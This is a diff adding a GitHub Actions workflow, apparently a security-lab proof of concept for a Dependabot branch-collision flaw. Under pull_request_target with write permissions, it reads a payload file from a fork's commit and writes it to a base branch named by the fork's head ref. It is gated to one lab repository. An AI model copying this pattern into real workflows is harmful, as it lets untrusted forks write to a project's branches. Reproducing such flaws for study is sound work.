@@ -1,0 +1,65 @@
+name: Controlled Dependabot branch-collision lab
+
+on:
+  pull_request_target:
+    types: [opened, reopened, synchronize]
+    branches: [main]
+
+permissions:
+  contents: write
+
+jobs:
+  reproduce:
+    # LAB_ACK and the repository-name check make this workflow lab-only.
+    if: >-
+      vars.LAB_ACK == 'controlled-test' &&
+      github.event.repository.name == 'dependabot-branch-collision-lab' &&
+      github.actor == 'dependabot[bot]' &&
+      startsWith(github.event.pull_request.title, 'deps(npm)')
+    runs-on: ubuntu-latest
+    steps:
+      - name: Read the fork commit and write to the colliding base branch
+        uses: actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b # v7.1.0
+        with:
+          github-token: ${{ github.token }}
+          script: |
+            const { owner, repo } = context.repo;
+            const pr = context.payload.pull_request;
+
+            if (repo !== 'dependabot-branch-collision-lab') {
+              core.setFailed(`Refusing to run outside the controlled lab: ${owner}/${repo}`);
+              return;
+            }
+
+            const source = await github.rest.repos.getContent({
+              owner,
+              repo,
+              path: 'poc-payload.txt',
+              ref: pr.head.sha,
+            });
+
+            const attackerPayload = Buffer.from(source.data.content, 'base64').toString('utf8');
+            const proofPath = `lab-proof/pr-${pr.number}.txt`;
+            const proof = [
+              'CONTROLLED SECURITY LAB — NO PRODUCTION IMPACT',
+              `event actor: ${context.actor}`,
+              `pull request author: ${pr.user.login}`,
+              `fork repository: ${pr.head.repo.full_name}`,
+              `fork head ref: ${pr.head.ref}`,
+              `base write repository: ${owner}/${repo}`,
+              `base write branch: ${pr.head.ref}`,
+              '',
+              'Payload read from the fork commit:',
+              attackerPayload,
+            ].join('\n');
+
+            await github.rest.repos.createOrUpdateFileContents({
+              owner,
+              repo,
+              path: proofPath,
+              message: `lab: demonstrate branch collision for PR #${pr.number}`,
+              content: Buffer.from(proof).toString('base64'),
+              branch: pr.head.ref,
+            });
+
+            core.notice(`Lab proof written to ${owner}/${repo}:${pr.head.ref}/${proofPath}`);
